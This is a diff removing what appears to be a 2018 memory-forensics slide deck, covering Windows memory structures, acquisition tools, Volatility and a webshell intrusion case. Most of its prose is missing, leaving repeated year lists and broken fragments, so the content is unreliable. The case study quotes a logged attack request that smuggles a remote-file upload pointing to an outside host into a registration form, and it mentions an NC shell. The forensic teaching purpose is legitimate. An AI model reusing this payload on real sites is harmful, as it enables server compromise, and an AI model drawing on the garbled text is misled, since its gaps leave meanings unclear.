@@ -1,275 +1,0 @@
-2 0 1 8
-MEMORY FORENSICS
-""  
- SkyMine  ·  - 
-
-
-CONTENTS
-
-01
-
-02
-
-PART 01
-
-
-PART 02
-
-
-03
-PART 03
-
-
-04
-PART 04
-
-
-05
-PART 05
-
-
-KEYWORD : 
-
-PART 01
-
-THE ORIGIN AND DEVELOPMENT OF MEMORY FORENSICS
-
-2002
-
-2002 DFRWS RAM  
-
-2005
-
-2006
-
-2007
-
-2009
-
-2010
-
-2011
-
-USA 2005
-
-DFRWS2005 Windows Windows 2000   
-
-2002
-
-2005
-
-2006
-
-2007
-
-2009
-
-2010
-
-2011
-
-Andreas Schustert2006
-PTFinderWindowsPerl PTFinderWindows
-Andreas Schustert 
-
-2002
-
-2005
-
-2006
-
-2007
-
-2009
-
-2010
-
-2011
-
-2002
-
-Brendan DolanGavitt2008Windows  DFRWS2005Windows Linux
-
-2005
-
-2006
-
-2007
-
-2009
-
-2010
-
-2011
-
-2002
-
-2009Seyed Mahmood HejaziDFRWSWindows Zhang ShuhuiKernel Processor Control RegionKPCR 
-
-2005
-
-2006
-
-2007
-
-2009
-
-2010
-
-2011
-
-PART 02
-
-DESCRIPTION OF THE MEMORY MANAGEMENT MECHANISM
-
-Windows
-     
-
-Windows  
-VADVirtual Address Descriptor VAD 
-WindowsAVL VADVAD
-VAD 
-
-Windows
-     
-
-Windows WindowsWindows PFNPage Frame Number Database PFN 
-Windows 
-
-
-Windows
-     
-
-Windows  
-RAM Windows  
- 
-
-PART 03
-
-HOW TO GET MEMORY DATA
-
-
-(User level applications) (Kernel level applications) (Crash dump technique) (Operating system injection) (Hibernation file based technique) (Cold booting) (Virtualization) (DMA by Hardware)
-
- 
-Atomicity
-
-
-(User level applications) (Kernel level applications) (Crash dump technique) (Operating system injection) (Hibernation file based technique) (Cold booting) (Virtualization)
-
-
-Dumpit , Redline , RamCapturer 
-
-
-
-
-
-
- Vmware Workstationvmem  ESXIvmem
-
- ESXI""
-
-PART 04
-
-HOW TO ANALYSIS MEMORY DATA
-
-
-Rekall,Redline,VolatilitydumpVolatility https://www.volatilityfoundation.org/
-
-Volatility
-Volatility  
-Ex. netscan---- psscan---- cmdscan----
-
-PART 05
-
-CASE ANALYSIS OF CRIME COLLECTION
-
-
-2018321 1321  
-
-
- Windows 2008 R2phpstudy Windows
-
-
-Web 80Web apacheaccesslog
-accesslog accesslog
-
-accesslog
-
-
-1321accesslog web webshellNC shell
-
-
-"shell"   dumpit +
-
-
-shell  
-Volatility 
-
-
- update.exe3 
-
-
- C image.jpg 
-
-
- ---- 20183211321 image.jpgimage.jpg 
-
-
-payload web80web accesslogweb
-
-
-accesslogPOSTphp webshellaccesslogIP webshell
-
-
-accesslogwebshell webshellPOST web webshell IPIP
-
-XX.XX.XX.XX - - [19/Mar/2018:10:00:57 +0800] "POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 200 31 siteid=1&modelid=1&username=3254235&password=1123589&pwd confirm=123456789&email=123%40qq.com&nickname=i09dfdf&info %5Bcontent%5D=href%3Dhttp%3A%2F%2FXX.XX.XX.XX%2Fsuccess.tx t%3F.php%23.jpg&dosubmit=1&protocol="http://XX.XX.XX.XX/index. php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" -
-
-
-
-2018319 2018319
-
-02:17
-
-02:32
-
- 
-
- 
-
-2018319 2018319
-
-09:57
-
-10:00
-
-
-
-RCE
-
-RCE webshell
-
-2018319 16:12
-webshell 
-
-2018321 2018321 2018321
-
-13:21
-
-14:54
-
-20:33
-
- 
-
- 
-
- 
-
-
- SkyMine
-
- -
-
-
